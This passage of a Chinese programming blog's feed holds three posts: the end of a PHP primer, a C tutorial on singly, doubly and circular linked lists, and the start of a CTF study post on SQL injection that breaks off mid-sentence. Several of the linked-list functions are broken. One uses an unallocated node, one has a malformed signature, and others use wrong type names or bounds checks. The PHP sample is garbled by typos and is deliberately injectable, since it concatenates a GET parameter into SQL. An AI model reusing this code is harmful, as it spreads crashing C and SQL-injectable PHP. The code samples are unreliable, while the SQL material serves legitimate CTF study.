class="number">0</span>) :</span><br><span class="line"><span class="comment">//PHP风格</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;TEST&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"><span class="keyword">endif</span>;</span><br></pre></td></tr></table></figure><h2 id="小结"><a class="markdownIt-Anchor" href="#小结"></a> 小结</h2><p>这一章我们快速的入门了PHP的知识，如果你已经有过C语言的基础，相信这个过程并不难。</p><p>再学一点PHP，直到能入门MySQL为止（勿忘初心）。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300411.jpg" alt="300411" /></p>]]></content>
      
      
      <categories>
          
          <category> PHP学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构什锦（二）——链表篇</title>
      <link href="/posts/b8cec82910c4/"/>
      <url>/posts/b8cec82910c4/</url>
      
        <content type="html"><![CDATA[<p>我们继续讲链表……(‘-ωก̀ )</p><h2 id="链表"><a class="markdownIt-Anchor" href="#链表"></a> 链表</h2><p>链表是一种用来储存元素集合的数据结构，它具有以下特性：</p><ul><li>节点由两部分组成，我称之为数据域和指针域，数据域存放你想通过链表储存的数据，而指针域存放指针</li><li>元素通过指针依次相连，即通过指针来指向其他元素</li><li>最后一个元素的指针为空（NULL）</li><li>在执行过程中，链表的长度可以自由伸缩</li><li>链表的长度可以是要求的任意长度，除非系统内存耗尽</li><li>它不会浪费内存空间（相对于开辟数组来说），但是需要额外的空间存放指针。</li></ul><h3 id="链表的抽象数据类型adt"><a class="markdownIt-Anchor" href="#链表的抽象数据类型adt"></a> 链表的抽象数据类型/ADT</h3><p>主要的操作：</p><ul><li>插入（Insert）：将一个元素插入链表中</li><li>删除（Delete）：删除并返回链表中指定位置上的元素</li></ul><p>辅助的操作：</p><ul><li>撤销链表（Delete List）：删除链表中的所有元素</li><li>计数（Count）：返回链表的元素个数（即链表长度）</li><li>查找（Search)：从链表的表尾开始查找第n个节点</li></ul><h3 id="为什么需要链表"><a class="markdownIt-Anchor" href="#为什么需要链表"></a> 为什么需要链表？</h3><p>在学习链表之前，我们一般使用数组来储存数据集合，那么，为什么我们需要链表呢？</p><p>我们首先来回顾一下数组。</p><h4 id="数组"><a class="markdownIt-Anchor" href="#数组"></a> 数组</h4><p>数组是指一片连续的内存块被分配给用户以储存数组元素，即数组是在内存中占据一组连续地址的储存单元。通过输入数组的下标，我们可以快速的访问数组中的任何元素。其时间复杂度为常数O(1)。</p><p>为了访问数组元素，元素的储存地址通常以相对其起始地址的偏移量计算得到，而这个计算需要通过一个乘法运算，即根据数据类型确定一个元素的大小乘以其被访问元素的下标以得到其偏移量，最后将偏移量与起始地址相加。整个过程包括一个乘法计算和加法计算，故数组的访问只需要一个常数时间即可完成。</p><h5 id="优势"><a class="markdownIt-Anchor" href="#优势"></a> 优势</h5><ul><li>简单、易使用。直接声明即可创建数组</li><li>访问元素速度快</li></ul><h5 id="缺点"><a class="markdownIt-Anchor" href="#缺点"></a> 缺点</h5><ul><li>固定大小：数组是静态的，在使用数组前就需要给它分配一个固定的大小</li><li>占据一个连续的储存空间，有时候可能无法获得一个足够大的连续内存去储存创建的数组</li><li>复杂的定位插入运算：在数组中插入或删除元素的操作十分麻烦，需要把在插入位置后的所有元素都向后移动一位，最坏的结果时间复杂度达到了O(n)。</li></ul><h4 id="链表的优势"><a class="markdownIt-Anchor" href="#链表的优势"></a> 链表的优势</h4><p>链表的最大优势是在常数时间内实现扩张。如果使用数组，有时候会出现内存不够的情况，这个时候你可以一开始分配一个内存很大的数组，但是如果你没有把数组全部塞满就会造成内存的浪费。所以这时候我们引入链表，我们首先为一个元素分配储存空间，然后轻松添加新元素。</p><h4 id="链表的缺点"><a class="markdownIt-Anchor" href="#链表的缺点"></a> 链表的缺点</h4><p>链表的主要缺点是单个元素的访问时间。</p><p>数组具有随机性，可以实现随机访问，访问每个数组元素所花费的时间相同。但是链表只能实现顺序访问，最坏的情况下访问链表中一个元素要花费O(n)的时间。尽管动态分配的储存分配是链表的一个强大优势，但与此伴随的是<strong>高储存开销</strong>。</p><p>最后链表还需要额外储存指针参数，浪费了储存空间。</p><h3 id="单链表"><a class="markdownIt-Anchor" href="#单链表"></a> 单链表</h3><p>我们常说的链表是指<strong>单链表</strong>。单链表包括一组节点，一个头节点和一个指向NULL的尾节点，每个节点有一个数据域和指针域。</p><p>下面我们声明一个简单的整形链表。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="链表的基本操作"><a class="markdownIt-Anchor" href="#链表的基本操作"></a> 链表的基本操作</h4><p>主要有：</p><ul><li>遍历链表</li><li>在链表中插入一个元素</li><li>在链表中删除一个元素</li></ul><p>下面我们来依次介绍对应的操作要怎么实现。</p><h5 id="遍历"><a class="markdownIt-Anchor" href="#遍历"></a> 遍历</h5><p>遍历涉及的操作很简单，我不多介绍了。遍历的作用主要就是用来计算数组长度或者依次显示数据，进而可以用来查找特定的节点。当遍历的节点指向的下一个节点为NULL时，遍历结束。</p><p>以下是代码的实现。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ListLength</span><span class="params">(<span class="keyword">struct</span> ListNode*head)</span>&#123;</span><br><span class="line">    <span class="comment">//这里新定义了一个指针指向头节点，是为了不改变头节点的值，相当于拷贝了一份头节点的副本</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>*<span class="title">current</span>=</span>head;</span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(current!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        count++;</span><br><span class="line">        current=current-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>扫描大小为n的列表，时间复杂度是O(n)。只创建了两个临时变量，空间复杂度为O(1)。</p><h5 id="插入"><a class="markdownIt-Anchor" href="#插入"></a> 插入</h5><p>对于单链表的插入有三种情况。</p><ul><li>在链表首元节点前插入一个新节点</li><li>在链表尾元节点后插入一个新节点</li><li>在链表中间部分插入一个新节点</li></ul><h6 id="在头部插入节点"><a class="markdownIt-Anchor" href="#在头部插入节点"></a> 在头部插入节点</h6><p>这时只需要更新一个节点的指针域，即申请一个新节点并修改其指针域指向原头结点，然后更新头指针指向新首元节点皆可以了。</p><h6 id="在尾部插入节点"><a class="markdownIt-Anchor" href="#在尾部插入节点"></a> 在尾部插入节点</h6><p>这个时候我们需要修改两个节点的指针域。</p><p>首先申请一个新节点，将其指针域的指针修改为NULL，然后修改原尾元节点使其指针指向新节点即可。</p><p>假如给定了我们一个想要插入节点的位置，我们仍然只需要修改两个指针的指针域。</p><ul><li>如果我们想要在第3个节点前插入新节点，那么我们首先要找到第2个节点。这意味着我们需要遍历两个节点后才能进行插入操作。为了便于描述，我们将第2个节点称为位置节点。新节点的指针域指向位置节点的下一个节点（即目标节点）</li><li>首先创建一个新节点，使新创立的节点指针域指向目标节点。</li><li>然后修改位置节点的指针域，使其指向新节点，这样我们便完成了中间节点的插入。</li></ul><p>下面我们根据以上三种情况编写代码。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> InsertInLinkedList&#123;<span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>**<span class="title">head</span>, <span class="title">int</span> <span class="title">data</span>, <span class="title">int</span> <span class="title">position</span>&#125;&#123;</span></span><br><span class="line">    <span class="comment">//这里用到了指针的指针，是为了更改头指针指向的节点</span></span><br><span class="line">    <span class="type">int</span> k=<span class="number">1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>*<span class="title">p</span>,*<span class="title">q</span>,*<span class="title">newNode</span>;</span></span><br><span class="line">    newNode=(ListNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ListNode));</span><br><span class="line">    <span class="keyword">if</span>(!newNode)&#123;</span><br><span class="line">        <span class="comment">//如果新节点申请失败则报错，检查合法性，增强健壮性</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Memory Error!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    newNode-&gt;data=data;</span><br><span class="line">    p=*head;<span class="comment">//p设置为头指针</span></span><br><span class="line">    <span class="comment">//在头部插入节点</span></span><br><span class="line">    <span class="keyword">if</span>(position==<span class="number">1</span>)&#123;</span><br><span class="line">        newNode-&gt;next=p;</span><br><span class="line">        *head=newNode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//遍历链表直到达到我们想要插入的位置为止</span></span><br><span class="line">        <span class="keyword">while</span>((p!=<span class="literal">NULL</span>)&amp;&amp;(k&lt;position))&#123;</span><br><span class="line">            k++;</span><br><span class="line">            q=p;</span><br><span class="line">            p=p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        q-&gt;next=newNode;<span class="comment">//这里有更好的方法实现这一点</span></span><br><span class="line">        newNode-&gt;next=p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，我们也可以根据三种不同的情况实现三种不同的函数。</p><h5 id="删除"><a class="markdownIt-Anchor" href="#删除"></a> 删除</h5><p>与插入类似，链表的删除也有三种情况。</p><ul><li>删除首元节点</li><li>删除尾元节点</li><li>删除中间部分的一个节点</li></ul><p>现在我们三种情况来讨论。</p><h6 id="删除头节点"><a class="markdownIt-Anchor" href="#删除头节点"></a> 删除头节点</h6><p>删除头节点一共需要两步。</p><ul><li>创建一个临时变量指向要删除的头节点。</li><li>修改头指针指向下一个节点，然后撤销临时指针变量指向的首元节点（free操作）。</li></ul><h6 id="删除尾节点"><a class="markdownIt-Anchor" href="#删除尾节点"></a> 删除尾节点</h6><p>同样的，我们删除尾节点时需要找到它的前驱节点。其实现分为三步。</p><ul><li>遍历列表找到前驱节点地址。我们需要两个指针变量指向尾元节点和尾元节点的直接前驱节点。</li><li>更新前驱节点的指针域，将其置为NULL。</li><li>撤销尾节点。</li></ul><h6 id="删除中间节点"><a class="markdownIt-Anchor" href="#删除中间节点"></a> 删除中间节点</h6><p>删除中间节点和前面的步骤类似，具体体现为更新前驱节点的指针域为待删除节点所指向的下一个节点，其余步骤相同。</p><p>现在我们用代码来实现删除节点。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DeleteNodeFromLinkedList</span><span class="params">(<span class="keyword">struct</span> LinkNode**head, <span class="type">int</span> position)</span>&#123;</span><br><span class="line">    <span class="type">int</span> k=<span class="number">1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>*<span class="title">p</span>,*<span class="title">q</span>;</span></span><br><span class="line">    <span class="keyword">if</span>(*head==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">//检查链表是否为空链表，此时仅一个节点</span></span><br><span class="line">        print(<span class="string">&quot;List Empty&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    p=*head;</span><br><span class="line">    <span class="comment">//删除首元节点</span></span><br><span class="line">    <span class="keyword">if</span>(position==<span class="number">1</span>)&#123;</span><br><span class="line">        *head=(*head)-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//遍历链表直到找到我们要删除的节点为止</span></span><br><span class="line">        <span class="keyword">while</span> ((p!=<span class="literal">NULL</span>)&amp;&amp;(k&lt;position))&#123;</span><br><span class="line">            k++;</span><br><span class="line">            q=p;</span><br><span class="line">            p=p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(p==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="comment">//到达表尾</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Position does not exist.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//被删除的元素位于表中</span></span><br><span class="line">            q-&gt;next=p-&gt;next;</span><br><span class="line">            <span class="built_in">free</span>(p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上算法的时间复杂度为O(n)，空间复杂度为O(1)。</p><p>以上是单链表的介绍。</p><h4 id="双链表"><a class="markdownIt-Anchor" href="#双链表"></a> 双链表</h4><p>双链表是指指针域上包含两个分别指向左右两边的前后驱节点指针的链表。相比单链表，双链表拥有更多优势。我们只需要得到双链表的一个节点，就可以访问整条链表上的所有元素。比如在单链表中得到一个节点，我们无法删除这个单个节点，因为这需要单节点的前驱节点才可以操作。而双链表则不然，我们可以通过元素的左指针找到它的直接前驱。</p><p>双链表也存在不足，主要体现在：</p><ul><li>每个节点都要求增加一个指针域，即需要更多的空间资源。</li><li>插入和删除节点需要花费的时间更长（因为新增了一个另一个方向的指针）</li></ul><p>除此之外，双链表的操作基本和单链表类似。如果掌握了单链表的操作，双链表也不是什么难事。</p><p>下面我们来创建一个简单的双链表模板。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DLLNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DLLNode</span>*<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DLLNode</span>*<span class="title">prev</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="双链表的插入"><a class="markdownIt-Anchor" href="#双链表的插入"></a> 双链表的插入</h5><p>双链表的插入操作与单链表一样可分为三种，即在头部、尾部和中间分别插入新节点。</p><h6 id="在头部插入节点-2"><a class="markdownIt-Anchor" href="#在头部插入节点-2"></a> 在头部插入节点</h6><p>双链表插入的步骤与单链表大致相同，唯一不同的地方就是此时多了一个左指针。我们也可以将插入步骤分为两步。</p><ul><li>申请一个新节点，把新节点的左指针置为NULL，右指针指向原头结点。</li><li>修改原首元节点使其左指针指向新节点，并把头指针指向新节点即可。</li></ul><h6 id="在尾部插入节点-2"><a class="markdownIt-Anchor" href="#在尾部插入节点-2"></a> 在尾部插入节点</h6><p>同上，也可分为两个步骤。</p><ul><li>申请新节点并遍历至链表尾元节点，修改新节点的左指针指向原尾元节点，右指针置为NULL。</li><li>修改原尾节点的右指针指向新节点即可。</li></ul><h6 id="在中间插入节点"><a class="markdownIt-Anchor" href="#在中间插入节点"></a> 在中间插入节点</h6><p>在中间插入节点可能有些复杂，因为要涉及到三个节点和四个指针，这里我们举例来说明更好理解。</p><p>假设有中间相邻节点a和b，现在要在b节点前插入p节点，伪代码示例如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p.prev=a;<span class="comment">//设置p的左右节点指向a，b</span></span><br><span class="line">p.next=b;</span><br><span class="line"></span><br><span class="line">a.next.prev=p;<span class="comment">//设置b的左指针指向p</span></span><br><span class="line">b.prev.next=p;<span class="comment">//设置a的右指针指向p</span></span><br></pre></td></tr></table></figure><p>现在我们来编写代码来实现这三种情况的插入。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DLLInsert</span><span class="params">(<span class="keyword">struct</span> DLLNode**head, <span class="type">int</span> data, <span class="type">int</span> position)</span>&#123;</span><br><span class="line">    <span class="type">int</span> k=<span class="number">1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DLLNode</span>*<span class="title">temp</span>,*<span class="title">newNode</span>;</span><span class="comment">//这里多了一个临时变量</span></span><br><span class="line">    <span class="keyword">if</span>(!newNode)&#123;</span><br><span class="line">        <span class="comment">//如果内存判断错误就退出</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Memory Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    newNode-&gt;data=data;<span class="comment">//装填数据</span></span><br><span class="line">    <span class="keyword">if</span>(position==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">//在头部插入节点</span></span><br><span class="line">        newNode-&gt;prev=<span class="literal">NULL</span>;</span><br><span class="line">        newNode-&gt;next=*head;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(*head)</span><br><span class="line">            (*head)-&gt;prev=newNode;<span class="comment">//如果头节点存在，增强健壮性</span></span><br><span class="line">        </span><br><span class="line">        *head=newNode;<span class="comment">//修改头指针指向新节点</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    temp=*head;</span><br><span class="line">    <span class="keyword">while</span>((k&lt;position<span class="number">-1</span>)&amp;&amp;temp-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">//这里没有使用else语句，因为如果触发了if判断将在if块内就进行返回</span></span><br><span class="line">        <span class="comment">//所以没有必要再加else</span></span><br><span class="line">        <span class="comment">//这里遍历到了要操作的节点，注意这里循环结束的条件是position-1</span></span><br><span class="line">        temp=temp-&gt;next;</span><br><span class="line">        k++;<span class="comment">//k为位置节点序号</span></span><br><span class="line">        <span class="comment">//此时temp即为待操作元素</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(k!=position<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Desired position does not exist.\n&quot;</span>);</span><br><span class="line">    &#125;<span class="comment">//如果在k到达position-1之前就退出循环，说明已经遍历到了表尾，所以不存在</span></span><br><span class="line">    newNode-&gt;next=temp-&gt;next;<span class="comment">//</span></span><br><span class="line">    newNode-&gt;prev=temp;</span><br><span class="line">    <span class="keyword">if</span> (temp-&gt;next)</span><br><span class="line">        <span class="comment">//如果temp的右指针不为空，也就是不是尾节点的话</span></span><br><span class="line">        temp-&gt;next-&gt;prev=newNode;</span><br><span class="line">    </span><br><span class="line">    temp-&gt;next=newNode;<span class="comment">//实际上是在temp及其后驱节点间插入了元素</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="双链表的删除"><a class="markdownIt-Anchor" href="#双链表的删除"></a> 双链表的删除</h5><p>删除的操作也分为三种情况：</p><ul><li>删除头节点</li><li>删除尾节点</li><li>删除中间节点</li></ul><h6 id="在头部删除节点"><a class="markdownIt-Anchor" href="#在头部删除节点"></a> 在头部删除节点</h6><p>删除头部节点，我们主要分为两步。</p><ul><li>创建一个临时声明的指针变量，指向当前头节点。</li><li>然后使头节点指针向后移动一位，并置头节点的左指针域为空，最后撤销临时变量指向的节点。</li></ul><h6 id="在尾部删除节点"><a class="markdownIt-Anchor" href="#在尾部删除节点"></a> 在尾部删除节点</h6><p>删除尾元节点，比删除首元节点稍微复杂一点，具体分为三步。</p><ul><li>遍历链表，直到找到尾元节点。注意在这个过程中需要始终保持当前所指结点和其前驱节点的地址。也就是说，我们需要定义两个临时变量来储存地址。</li><li>置尾元节点的前驱节点右指针域为空。</li><li>删除当前所指结点/尾元节点。</li></ul><h6 id="在中间删除节点"><a class="markdownIt-Anchor" href="#在中间删除节点"></a> 在中间删除节点</h6><p>我们一样分为两步。</p><ul><li>与删除尾元节点类似，在遍历期间始终保存当前节点的前驱节点地址。一旦找到了需要删除的节点，就通过修改其前驱节点的右指针使其指向所指结点的右指针域下一个节点，再修改所指结点的下一个指向元素左指针域使其指向被删除节点的前驱节点。</li><li>释放所指结点</li></ul><p>下面是实现的代码。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DLLNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DLLNode</span> *<span class="title">prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>  <span class="title">DLLNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">DLLDelete</span><span class="params">(<span class="keyword">struct</span> DLLNode **head,<span class="type">int</span> position)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DLLNode</span> *<span class="title">temp1</span>,*<span class="title">temp2</span>,*<span class="title">temp</span>=</span>*head;</span><br><span class="line">    <span class="type">int</span> k=<span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(*head==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;List is empty&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(position==<span class="number">1</span>)&#123;<span class="comment">//如果删除的是首节点</span></span><br><span class="line">        *head=(*head)-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(*head!=<span class="literal">NULL</span>)</span><br><span class="line">            (*head)-&gt;prev=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>((k&lt;position)&amp;&amp;temp-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        temp=temp-&gt;next;</span><br><span class="line">        k++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(k!=position<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Desired position does not exist.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    temp2=temp-&gt;prev;</span><br><span class="line">    temp2-&gt;next=temp-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(temp-&gt;next)<span class="comment">//如果删除的是中间的一个点</span></span><br><span class="line">        temp-&gt;next-&gt;prev=temp2;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(temp);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="循环链表"><a class="markdownIt-Anchor" href="#循环链表"></a> 循环链表</h4><p>循环链表和前面的两种形式不同，它没有NULL指针域，即每个节点都有其后继节点。在循环链表中，头节点可以访问其所有链表。当几个进程正在轮流使用相同的计算机资源相同的时间时，我们必须确保在它们完成前没有其他进程访问该资源（轮询算法）。下面是一个循环链表的类型声明。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CLLNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CLLNode</span>* <span class="title">Next</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr /><p>（待更新……）</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300470.jpg" alt="300470" /></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFer的苦痛之路——SQL注入篇</title>
      <link href="/posts/e7a35b1664fc/"/>
      <url>/posts/e7a35b1664fc/</url>
      
        <content type="html"><![CDATA[<p>作为网安的学生，不系统的学习一下CTF比赛，真是有点愧对这个专业了。然而CTF这条路必定道阻且长，实践性极强而且门槛参差不齐，且缺乏系统的入门学习方法。过了一年了，从一开始的编程零基础到现在掌握了一些必要的编程技巧，终于打算仔细钻研一下CTF了。</p><p>我用的书本是《从0到1 CTFer成长之路》，不用说，听书名就觉得这劲度不下与苦痛之路口牙。总之姑且就先这么开干了，也许后续还会参考一些其他比赛或者靶场的题目以及CTF Wiki。</p><p>另外，由于个人原因，并不会按照书上的编排顺序进行学习。一是兴趣方向所需，二是有一些知识点暂时还理解不了……（比如git泄露我连git都还没学啊喂）（我是蒻笱）</p><p>那么 <font color="red"  size="10px">CTF 启动！！！</font></p><hr /><p>如上文提到的，关于CTF的知识学习由我个人兴趣决定。那么我们就先来试试SQL注入。</p><p>SQL注入……理论上需要一定的PHP和MySQL基础，然而两个我都还没学（别骂了），所以注定是困难重重，学习效果如何也不敢保证。暑假的时候听了听学校夏令营，感觉有了点眉目，然而还是写不出来题目（SQL语句太长了记不住……）。无论如何，还是先开始吧。</p><h2 id="sql注入基础"><a class="markdownIt-Anchor" href="#sql注入基础"></a> SQL注入基础</h2><p>web应用开发中，为了内容快速更新，很多开发者把数据放在数据库中进行储存。但是由于开发者对用户数据传入的过滤不严格，可能将攻击载荷拼接到正常的SQL查询语句中，再将这些查询语句交由后端的数据库里执行，从而引发和预期功能不一致的语句，我们称之为<strong>SQL注入</strong>。这通常将导致数据库的信息泄露、篡改甚至删除。这里我们将介绍几种常见的SQL注入类型，包括<strong>数字型注入、UNION注入/联合注入、字符型注入、布尔盲注、时间注入、报错注入和堆叠注入</strong>。</p><h3 id="数字型注入和union注入"><a class="markdownIt-Anchor" href="#数字型注入和union注入"></a> 数字型注入和UNION注入</h3><p>借用书上的例题，我们先给出第一个例子的PHP代码。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//连接本地MySQL,数据库为test</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_ <span class="title function_ invoke__">connect</span>(<span class="string">&quot;127.0.0.1&quot;</span> <span class="string">&quot;root&quot;</span> , <span class="string">&quot;root&quot;</span> , <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="comment">//查询wp_news表的title、content字段，id为GET输入的值</span></span><br><span class="line"><span class="variable">$res</span> = mlysqli. <span class="title function_ invoke__">_query</span>(<span class="variable">$conn</span>, <span class="string">&quot;SELECT title, content FROM wp_news WHERE id=&quot;</span> .$. GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="comment">//说明:代码和命令对于SQL语句不区分大小写，书中为了让读者清晰表示，对于关键字采用大写形式</span></span><br><span class="line"><span class="comment">//将查询到的结果转化为数组</span></span><br><span class="line"><span class="variable">$row</span> = mysqli _fetch. <span class="keyword">array</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//输出结果中的title字段值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;&quot;</span>. <span class="variable">$row</span>[<span class="string">&#x27;title&#x27;</span>]. <span class="string">&quot;&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//输出结果中的content字段值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;&quot;</span>. <span class="variable">$row</span>[ <span class="string">&#x27;content&#x27;</span>]. <span class="string">&quot;&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>数据库的表结构见图1-1，新闻表wp_news的内容见图1-2，用户wp_user的内容见图1-3。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20230918142004.png" alt="img" /></p><center>图1-1</center><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20230918142133.png" alt="img" /></p><center>图1-2</center><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231017233825699.png" alt="image-20231017233825699" /></p><center>图1-3</center><p>顺便给定一个目标网址<code>http://192.168.20.133/sql1.php</code>，然而这个网址是打不开的，我也不知道为什么。</p><p>那么本节的目标就是通过HTTP的GET函数来获取输入的id值，将本应该查询新闻表的功能转变为查询admin（通常是管理员）的账号和密码（密码通常是hash值，这里为了演示就变成明文this_is_the_admin_password）。获取管理员账户和密码后，入侵者可以通过它登录网站后台，从而控制整个网站内容。</p><p>首先我们访问<code>http://192.168.20.133/sql1.php?id=1</code>，结果如下图1-4。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20230918143049.png" alt="img" /></p><center>图1-4</center><p>这里运用到了GET请求发送了一个id为1的参数，最后得到的结果与新闻表wp_news中第一行id为1的结果一致。事实上，PHP将GET方法传入的<code>id=1</code>与前面的SQl语句进行了拼接，原查询语句如下。</p><p><code>$res = mysqli _query($conn, &quot;SELECT title, content FROM wp_news WHERE id=&quot;.$_GET['id']);</code></p><p>在收到<code>id=1</code>后，<code>.$_GET['id']</code>被赋值为1，最后传递给MySQL的查询语句如下。</p><p><code>SELECT title, content FROM wp_news WHERE id = 